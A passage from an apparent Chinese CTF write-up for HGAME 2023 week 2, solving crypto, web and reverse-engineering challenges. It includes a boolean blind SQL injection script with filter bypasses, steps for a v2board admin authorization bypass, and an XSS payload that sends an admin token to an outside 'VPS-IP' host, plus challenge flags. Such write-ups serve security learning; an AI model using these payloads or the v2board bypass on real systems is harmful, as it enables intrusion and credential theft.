r.text:</span><br><span class="line">        <span class="built_in">print</span>(k,quote(token),r.text)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 6 NnL3arZc7tt%2Bezcky%2BB8fF675UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt%2BA%3D%3D Vidar-Tu buy firecracker successfully</span></span><br></pre></td></tr></table></figure><p>修改cookie中的token，购买flag，得到flag：<code>hgame&#123;5o_Eas9_6yte_flip_@t7ack_wi4h_4ES-CTR&#125;</code>。</p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h3><blockquote><p>电视剧里的黑客?真正的黑客！</p></blockquote><p>题目即提示，git泄露。</p><p>访问 <code>http://HOST:PORT/.git/</code>，使用wget下载git目录：</p><p><code>wget -r http://week-2.hgame.lwsec.cn:31765/.git/</code></p><p>进入 <code>.git/logs</code>，使用 <code>git reflog</code> 查看所有分支的所有操作记录（包括已经被删除的 commit 记录和 reset 的操作）；</p><p>选择需要查看的记录，<code>git show 1dd69e2</code> 拿到flag：<code>hgame&#123;Don&#39;t^put*Git-in_web_directory&#125;</code>。</p><p>​    </p><h3 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h3><blockquote><p>请尝试获取Admin用户的订阅链接，flag格式为hgame{admin用户订阅链接中的token值}。</p></blockquote><p>v2board存在越权漏洞，参考<a href="https://www.ctfiot.com/88960.html">v2board越权漏洞复现</a>。</p><p>首先注册一个普通用户账号，然后通过 <code>http://HOST:PORT/api/v1/passport/auth/login</code> 接口登录该账号，会返回一个 <code>auth_data</code> 值；</p><p>然后访问 <code>http://HOST:PORT/api/v1/user/login</code> 接口，并将上述获得的 <code>auth_data</code> 作为authorization头发送，让服务器将普通用户的Authorization头写入缓存中；</p><p>最后只要带上这个Authorization头即可访问所有的管理员接口。</p><p>访问 <code>http://HOST:PORT/api/v1/admin/user/fetch?pageSize=10&amp;current=1</code>，得到flag：<code>hgame&#123;39d580e71705f6abac9a414def74c466&#125;</code>。</p><p>​    </p><h3 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h3><blockquote><p>R1esbyfe给兔兔写了一个简易的查询面板，只需要输入id数字，就可以查到兔兔最近买的东西（包括年货）</p><p>R1esbyfe:”面板登陆用户名是user01,密码……忘了，反正是个比较好猜的密码”</p><p>貌似R1esbyfe还藏了点惊喜，你能帮助兔兔找到它吗？</p><p>(数据库启动需要时间，若出现Internal Error，需要稍等片刻)</p><p>HINTS:</p><p>密码是弱密码，可以自己找个dict爆破一下</p></blockquote><p>根据hint猜密码 <code>admin123</code>，sql注入，fuzz发现过滤了空格、select、database、or、等号、大小于号等关键字。关键字改大写，等号改 <code>regexp</code> 绕过。</p><p>布尔盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.digits+string.ascii_letters+<span class="string">&#x27;&#123;&#125;-_?!,&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://week-2.hgame.lwsec.cn:30685/search&#x27;</span></span><br><span class="line">now = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(DATABASE())&#x27;</span></span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(group_concat(table_name))FROM(infOrmation_schema.tables)WHERE((table_schema)regexp(&quot;se4rch&quot;))&#x27;</span></span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(group_concat(column_name))FROM(infOrmation_schema.columns)WHERE((table_name)regexp(&quot;5ecret15here&quot;))&#x27;</span></span><br><span class="line">        sql = <span class="string">&#x27;SELECT(hex(f14gggg1shere))FROM(se4rch.5ecret15here)&#x27;</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;))&quot;</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;search_id&#x27;</span>:payload&#125;</span><br><span class="line">        cookie = &#123;<span class="string">&#x27;SESSION&#x27;</span>:<span class="string">&#x27;MTY3MzYyOTg3OXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT18Znqyk--boNReiPrlLxxyJ0FrSzzwttTHP8L2NJy6KFg=&#x27;</span>&#125;</span><br><span class="line">        r = s.post(url,data=data,cookies=cookie)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hard disk&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            now += j</span><br><span class="line">            <span class="built_in">print</span>(now)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># database: se4rch</span></span><br><span class="line"><span class="comment"># table: 5ecret15here,L1st,user1nf0</span></span><br><span class="line"><span class="comment"># column: f14gggg1shere</span></span><br><span class="line"><span class="comment"># 6867616d657b345f4d346e5f5748305f4b6e3077735f5765346b2d50347373573072645f416e645f53514c217d</span></span><br></pre></td></tr></table></figure><p>得到flag：<code>hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;</code>。</p><p>​    </p><h3 id="Designer"><a href="#Designer" class="headerlink" title="Designer"></a>Designer</h3><blockquote><p>Come and design your button</p></blockquote><p>在 <code>index.js</code> 中 <code>/button/share</code> 路由会调用 <code>/button/preview</code> 路由：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/button/share&quot;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">    <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium&quot;</span>,</span><br><span class="line">    <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">  <span class="keyword">const</span> query = querystring.<span class="title function_">encode</span>(req.<span class="property">body</span>)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:9090/button/preview?&#x27;</span> + query)</span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;jwt_token_here&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;#button&quot;</span>)</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;admin will see it later&quot;</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/button/preview&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> blacklist = [</span><br><span class="line">    <span class="regexp">/on/i</span>, <span class="regexp">/localStorage/i</span>, <span class="regexp">/alert/</span>, <span class="regexp">/fetch/</span>, <span class="regexp">/XMLHttpRequest/</span>, <span class="regexp">/window/</span>, <span class="regexp">/location/</span>, <span class="regexp">/document/</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> req.<span class="property">query</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="title function_">test</span>(key.<span class="title function_">trim</span>()) || item.<span class="title function_">test</span>(req.<span class="property">query</span>[key].<span class="title function_">trim</span>())) &#123;</span><br><span class="line">        req.<span class="property">query</span>[key] = <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;preview&quot;</span>, &#123; <span class="attr">data</span>: req.<span class="property">query</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>测试发现 <code>/button/preview</code> 路由存在XSS注入，尝试XSS请求伪造：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://127.0.0.1:9090/user/register&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;));</span><br><span class="line">url=<span class="string">&quot;http://VPS-IP/x.php?token=&quot;</span>+<span class="title class_">String</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line"><span class="keyword">var</span> xhr2=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr2.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,url,<span class="literal">false</span>);</span><br><span class="line">xhr2.<span class="title function_">send</span>(<span class="string">&quot;token&quot;</span>);</span><br></pre></td></tr></table></figure><p>admin点击后，生成正确token，发送到VPS的apache日志中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[16/Jan/2023:01:01:39 +0800] &quot;GET /x.php?token=&#123;%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiaGdhbWV7Yl9jNHJlX2FiMHV0X3Byb3AzcnQxdHlfaW5qRWN0aU9ufSIsImlhdCI6MTY3MzgwMjA5OX0.pthLzDWpdJf3vb1pEBZbAknqfCq90xpL4ntnE3wpKdY%22&#125; HTTP/1.1&quot; 200 416 &quot;http://127.0.0.1:9090/&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/109.0.5414.74 Safari/537.36&quot;</span><br></pre></td></tr></table></figure><p>解析jwt，得到flag：<code>hgame&#123;b_c4re_ab0ut_prop3rt1ty_injEctiOn&#125;</code>。</p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="before-main"><a href="#before-main" class="headerlink" title="before_main"></a>before_main</h3><p>在 <code>sub_558AEC339229()</code> 中使用 <code>ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)</code>  机制将base64码表修改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_558AEC339229</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;qword_558AEC33C020, <span class="string">&quot;qaCpwYM2tO/RP0XeSZv8kLd6nfA7UHJ1No4gF5zr3VsBQbl9juhEGymc+WTxIiDK&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x636D79474568756A</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再解码即可，flag：<code>hgame&#123;s0meth1ng_run_befOre_m@in&#125;</code>。</p><p>​    </p><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><blockquote><p>兔兔假期前学习了编程，你能看出来他学的是什么语言吗</p></blockquote><p>python程序逆向，使用pyinstxtractor将exe解包得到 <code>stream.pyc</code> 文件，再用uncompyle6反编译，得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: stream.pyc (Python 3.8)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">key</span>):</span><br><span class="line">Warning: block stack <span class="keyword">is</span> <span class="keyword">not</span> empty!</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = tmp</span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">            tmp = s[i]</span><br><span class="line">            s[i] = s[j]</span><br><span class="line">            s[j] = tmp</span><br><span class="line">            data.append(s[(s[i] + s[j]) % <span class="number">256</span>])</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text, key</span>):</span><br><span class="line">Warning: block stack <span class="keyword">is</span> <span class="keyword">not</span> empty!</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(text, gen(key)):</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ k)</span><br><span class="line">        result = base64.b64encode(result.encode()).decode()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">text = <span class="built_in">input</span>(<span class="string">&#x27;Flag: &#x27;</span>)</span><br><span class="line">key = <span class="string">&#x27;As_we_do_as_you_know&#x27;</span></span><br><span class="line">enc = encrypt(text, key)</span><br><span class="line"><span class="keyword">if</span> enc == <span class="string">&#x27;wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;yes!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="literal">None</span>(<span class="string">&#x27;try again...&#x27;</span>)</span><br></pre></td></tr></table></figure><p>识别为RC4加密算法，cyberchef解出flag：<code>hgame&#123;python_reverse_is_easy_with_internet&#125;</code>。</p><p>​    </p><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><blockquote><p>由于兔兔的学校提前放假，开学才能期末考试，于是兔兔开始了他的寒假期末复习~</p></blockquote><p>实际为解非齐次线性方程组，矩阵乘法逆运算，这里使用z3求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = [<span class="number">126</span>, <span class="number">225</span>, <span class="number">62</span>, <span class="number">40</span>, <span class="number">216</span>, <span class="number">253</span>, <span class="number">20</span>, <span class="number">124</span>, <span class="number">232</span>, <span class="number">122</span>, <span class="number">62</span>, <span class="number">23</span>, <span class="number">100</span>, <span class="number">161</span>, <span class="number">36</span>, <span class="number">118</span>, <span class="number">21</span>, <span class="number">184</span>, <span class="number">26</span>, <span class="number">142</span>, <span class="number">59</span>, <span class="number">31</span>, <span class="number">186</span>, <span class="number">82</span>, <span class="number">79</span>]</span><br><span class="line">out = [<span class="number">0</span>] * <span class="built_in">len</span>(x)</span><br><span class="line">c = [<span class="number">63998</span>, <span class="number">33111</span>, <span class="number">67762</span>, <span class="number">54789</span>, <span class="number">61979</span>, <span class="number">69619</span>, <span class="number">37190</span>, <span class="number">70162</span>, <span class="number">53110</span>, <span class="number">68678</span>, <span class="number">63339</span>, <span class="number">30687</span>, <span class="number">66494</span>, <span class="number">50936</span>, <span class="number">60810</span>, <span class="number">48784</span>, <span class="number">30188</span>, <span class="number">60104</span>, <span class="number">44599</span>, <span class="number">52265</span>, <span class="number">43048</span>, <span class="number">23660</span>, <span class="number">43850</span>, <span class="number">33646</span>, <span class="number">44270</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">f = [Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line">ff = f[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            out[<span class="number">5</span>*i+j] += ff[<span class="number">5</span>*i+k] * x[<span class="number">5</span>*k+j]</span><br><span class="line">        s.add(out[<span class="number">5</span>*i+j] == c[<span class="number">5</span>*i+j])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(m[f[i]].as_long())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;y0ur_m@th_1s_gO0d&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="VidarCamera"><a href="#VidarCamera" class="headerlink" title="VidarCamera"></a>VidarCamera</h3><blockquote><p>兔兔最近在学习Android开发，这是他抄的相机程序</p></blockquote><p>apk内关键代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span>[] m229encrypthkIa6DI(<span class="type">int</span>[] iArr) &#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span>[] m446constructorimpl = UIntArray.m446constructorimpl(<span class="number">4</span>);</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">0</span>, <span class="number">2233</span>);</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">1</span>, <span class="number">4455</span>);</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">2</span>, <span class="number">6677</span>);</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">3</span>, <span class="number">8899</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i2 &lt; <span class="number">9</span>) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">i3++;</span><br><span class="line">i = i2 + <span class="number">1</span>;</span><br><span class="line">UIntArray.m457setVXSXFK8(iArr, i2, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(i4 &amp; <span class="number">3</span>)) + i4) ^ UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &lt;&lt; <span class="number">4</span>) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &gt;&gt;&gt; <span class="number">5</span>)) + UIntArray.m452getpVg5ArA(iArr, i))) ^ i4)));</span><br><span class="line">UIntArray.m457setVXSXFK8(iArr, i, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &lt;&lt; <span class="number">4</span>) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &gt;&gt;&gt; <span class="number">5</span>)) + UIntArray.m452getpVg5ArA(iArr, i2)) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(UInt.m393constructorimpl(i4 &gt;&gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + i4))));</span><br><span class="line">i4 = UInt.m393constructorimpl(i4 + <span class="number">878077251</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (i3 &lt;= <span class="number">32</span>);</span><br><span class="line">i2 = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> iArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> m230onCreate$lambda0(EditText inputsomething, CameraActivity <span class="built_in">this</span>$<span class="number">0</span>, AlertDialog alertDialog, View view) &#123;</span><br><span class="line">Intrinsics.checkNotNullParameter(inputsomething, <span class="string">&quot;$inputsomething&quot;</span>);</span><br><span class="line">Intrinsics.checkNotNullParameter(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> inputsomething.getText().toString();</span><br><span class="line"><span class="keyword">if</span> (obj.length() != <span class="number">40</span>) &#123;</span><br><span class="line">Toast.makeText(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;序列号不正确&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span>[] m446constructorimpl = UIntArray.m446constructorimpl(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">40</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, i / <span class="number">4</span>, UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(obj.charAt(i)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">1</span>) &lt;&lt; <span class="string">&#x27;\b&#x27;</span>)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span>)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span>[] m229encrypthkIa6DI = <span class="built_in">this</span>$<span class="number">0.</span>m229encrypthkIa6DI(m446constructorimpl);</span><br><span class="line">UInt[] uIntArr = &#123;UInt.m387boximpl(<span class="number">637666042</span>), UInt.m387boximpl(<span 